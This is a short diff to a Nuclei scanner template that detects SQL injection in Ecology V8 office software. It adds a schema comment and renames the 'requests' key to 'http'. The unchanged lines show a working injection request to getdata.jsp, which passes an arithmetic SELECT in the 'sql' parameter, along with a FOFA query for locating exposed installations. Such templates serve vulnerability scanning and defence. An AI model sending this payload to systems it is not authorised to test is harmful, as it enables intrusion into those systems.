@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: ecology-v8-sqli
 info:
   name: Ecology V8 - SQL Injection
@@ -8,7 +9,7 @@ info:
   metadata:
     fofa-query: app="泛微-协同办公OA"
   tags: ecology,sqli
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+547653*865674+as+id"
